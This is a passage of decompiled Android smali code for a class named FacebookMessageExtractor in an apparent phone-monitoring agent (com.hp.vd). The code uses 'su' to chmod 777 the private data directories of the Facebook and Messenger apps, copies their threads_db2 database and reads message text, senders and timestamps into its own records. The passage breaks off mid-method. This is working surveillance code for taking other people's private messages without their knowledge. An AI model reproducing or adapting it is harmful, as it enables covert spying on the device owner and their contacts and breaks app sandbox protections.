.class public Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;
.super Ljava/lang/Object;
.source "FacebookMessageExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "FbMsgExtractor"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "fbMsgTemp"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected facebookMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/FacebookMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/FacebookMessageData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 39
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 40
    iput-object p1, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 41
    iput-object p2, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 42
    iput-object p3, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 43
    iput-object p4, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 4

    .line 360
    iget-object v0, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 363
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "su"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 364
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 367
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 368
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "chmod -R 777 "

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 371
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "chmod 777 "

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 374
    :goto_0
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 376
    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 377
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 379
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string p2, "FbMsgExtractor"

    const-string v1, "chmod(): InterruptedException"

    .line 387
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_1

    :catch_1
    move-exception p1

    const-string p2, "FbMsgExtractor"

    const-string v1, "chmod(): IOException"

    .line 384
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 443
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 444
    new-instance v1, Lcom/hp/vd/module/monitor/facebook/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/monitor/facebook/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 446
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 447
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 451
    iget-object v0, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "FbMsgExtractor"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 428
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 429
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 431
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 432
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 434
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 436
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 437
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected detectRootPath()Ljava/lang/String;
    .locals 6

    const/4 v0, 0x2

    .line 332
    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "/data/data/com.facebook.orca/"

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "/data/data/com.facebook.katana/"

    const/4 v3, 0x1

    aput-object v1, v0, v3

    .line 340
    array-length v1, v0

    :goto_0
    if-ge v2, v1, :cond_1

    aget-object v4, v0, v2

    .line 341
    new-instance v5, Ljava/io/File;

    invoke-direct {v5, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    if-eqz v5, :cond_0

    .line 343
    invoke-virtual {v5}, Ljava/io/File;->isDirectory()Z

    move-result v5

    if-ne v5, v3, :cond_0

    return-object v4

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    return-object v0
.end method

.method protected extractRecipient(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 12

    .line 262
    new-instance v0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/Columns;

    invoke-direct {v0}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/Columns;-><init>()V

    const-string v2, "threads"

    const/4 v10, 0x2

    .line 264
    new-array v3, v10, [Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "name"

    const/4 v11, 0x0

    aput-object v1, v3, v11

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "senders"

    const/4 v4, 0x1

    aput-object v1, v3, v4

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "thread_key"

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " = ?"

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-array v6, v4, [Ljava/lang/String;

    aput-object p2, v6, v11

    const/4 p2, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    move-object v1, p1

    move-object v4, v5

    move-object v5, v6

    move-object v6, p2

    invoke-virtual/range {v1 .. v9}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    return-object p2

    .line 285
    :cond_0
    :try_start_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_1

    .line 286
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    return-object p2

    .line 291
    :cond_1
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "senders"

    invoke-interface {p1, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {p1, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    .line 292
    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2, v1}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    .line 295
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v1

    if-gtz v1, :cond_2

    .line 296
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    return-object p2

    .line 302
    :cond_2
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v1

    if-le v1, v10, :cond_3

    .line 303
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string p3, "name"

    invoke-interface {p1, p3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result p3

    invoke-interface {p1, p3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object p3

    .line 304
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    .line 306
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " (group)"

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    return-object p3

    .line 310
    :cond_3
    :goto_0
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-ge v11, v0, :cond_5

    .line 311
    invoke-virtual {v2, v11}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v0

    const-string v1, "user_key"

    .line 313
    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    .line 314
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    const-string p3, "name"

    .line 316
    invoke-virtual {v0, p3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    return-object p3

    :cond_4
    add-int/lit8 v11, v11, 0x1

    goto :goto_0

    :catch_0
    move-exception p3

    .line 321
    invoke-virtual {p3}, Lorg/json/JSONException;->printStackTrace()V

    .line 324
    :cond_5
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    return-object p2
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 1

    .line 353
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 355
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1
.end method

.method protected prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;
    .locals 4

    const/4 v0, 0x0

    .line 400
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 414
    :try_start_1
    invoke-virtual {p2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    const/16 v1, 0x10

    invoke-static {p1, v0, v1}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object p1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 417
    iget-object v1, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "FbMsgExtractor"

    const-string v3, "Exception caught while opening database."

    invoke-interface {v1, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 418
    invoke-virtual {p2}, Ljava/io/File;->delete()Z

    return-object v0

    :catch_1
    move-exception p1

    .line 402
    iget-object p2, p0, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "FbMsgExtractor"

    const-string v2, "prepareDatabase(): Exception caught during coping database to a temporary location."

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method

.method public run()V
    .locals 18

    move-object/from16 v1, p0

    const-string v2, "fbMsgTemp"

    .line 53
    invoke-virtual {v1, v2}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    .line 59
    invoke-virtual/range {p0 .. p0}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->detectRootPath()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    if-nez v2, :cond_0

    .line 62
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "FbMsgExtractor"

    const-string v5, "Could not find target root directory"

    invoke-interface {v2, v4, v5, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 67
    :cond_0
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "/databases/threads_db2"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-wide/16 v5, 0x0

    .line 69
    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 70
    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    const/4 v7, 0x2

    .line 76
    new-array v8, v7, [Ljava/lang/String;

    const/4 v9, 0x0

    aput-object v2, v8, v9

    aput-object v4, v8, v3

    .line 81
    array-length v2, v8

    move v10, v9

    :goto_0
    if-ge v10, v2, :cond_2

    aget-object v11, v8, v10

    .line 82
    invoke-virtual {v1, v11}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v12

    if-nez v12, :cond_1

    .line 83
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v12

    invoke-virtual {v1, v11, v12}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    :cond_1
    add-int/lit8 v10, v10, 0x1

    goto :goto_0

    .line 91
    :cond_2
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 93
    invoke-virtual {v2}, Ljava/io/File;->isFile()Z

    move-result v4

    const/4 v8, 0x3

    if-nez v4, :cond_3

    .line 94
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "FbMsgExtractor"

    const-string v4, "Database file is not a file."

    invoke-interface {v2, v3, v4, v8}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 99
    :cond_3
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_4

    .line 100
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "FbMsgExtractor"

    const-string v4, "Database file does not exist."

    invoke-interface {v2, v3, v4, v8}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 105
    :cond_4
    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v10

    cmp-long v4, v10, v5

    if-nez v4, :cond_5

    .line 106
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "FbMsgExtractor"

    const-string v4, "Database file is 0L long."

    invoke-interface {v2, v3, v4, v8}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_5
    const/4 v4, 0x0

    :try_start_0
    const-string v5, "fbMsgTemp"

    const-string v6, "db"

    .line 119
    iget-object v10, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 122
    invoke-virtual {v10}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    invoke-virtual {v10}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v10

    invoke-virtual {v10}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v10

    .line 119
    invoke-static {v5, v6, v10}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-nez v5, :cond_6

    .line 126
    :try_start_1
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "FbMsgExtractor"

    const-string v4, "Could not create the temporary database."

    invoke-interface {v2, v3, v4, v8}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :catch_0
    move-exception v0

    move-object v2, v0

    goto/16 :goto_2

    .line 131
    :cond_6
    invoke-virtual {v1, v2, v5}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2

    if-nez v2, :cond_7

    .line 134
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "FbMsgExtractor"

    const-string v4, "Could not open the temporary database."

    invoke-interface {v2, v3, v4, v8}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 136
    invoke-virtual {v5}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    .line 155
    :cond_7
    iget-object v4, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v6, "max_time"

    invoke-virtual {v4, v6}, Lcom/hp/vd/data/ModuleData;->customGetLong(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v4

    .line 159
    :try_start_2
    new-instance v6, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/Columns;

    invoke-direct {v6}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/Columns;-><init>()V

    const-string v10, "messages"

    const/4 v11, 0x4

    .line 161
    new-array v11, v11, [Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v12, "thread_key"

    aput-object v12, v11, v9

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v12, "text"

    aput-object v12, v11, v3

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v12, "sender"

    aput-object v12, v11, v7

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v7, "timestamp_ms"

    aput-object v7, v11, v8

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, " LENGTH("

    invoke-virtual {v7, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v12, "text"

    invoke-virtual {v7, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, ") > 0 AND "

    invoke-virtual {v7, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v12, "timestamp_ms"

    invoke-virtual {v7, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, " > ?"

    invoke-virtual {v7, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    new-array v13, v3, [Ljava/lang/String;

    .line 171
    invoke-virtual {v4}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v13, v9

    const/4 v14, 0x0

    const/4 v15, 0x0

    const/16 v16, 0x0

    const-string v17, "500"

    move-object v9, v2

    .line 161
    invoke-virtual/range {v9 .. v17}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    if-nez v3, :cond_8

    .line 180
    iget-object v3, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v6, "FbMsgExtractor"

    const-string v7, "Cursor is null"

    invoke-interface {v3, v6, v7, v8}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 182
    invoke-virtual {v2}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    .line 183
    invoke-virtual {v5}, Ljava/io/File;->delete()Z

    return-void

    :cond_8
    if-eqz v3, :cond_9

    move-object v7, v4

    .line 189
    :goto_1
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v8

    if-eqz v8, :cond_a

    .line 190
    new-instance v7, Lcom/hp/vd/data/FacebookMessageData;

    invoke-direct {v7}, Lcom/hp/vd/data/FacebookMessageData;-><init>()V

    .line 192
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v8, "thread_key"

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v7, Lcom/hp/vd/data/FacebookMessageData;->threadId:Ljava/lang/String;

    .line 193
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v8, "text"

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v7, Lcom/hp/vd/data/FacebookMessageData;->body:Ljava/lang/String;

    .line 199
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v8, "timestamp_ms"

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v8

    invoke-static {v8, v9}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v8

    .line 200
    new-instance v9, Ljava/util/Date;

    invoke-virtual {v8}, Ljava/lang/Long;->longValue()J

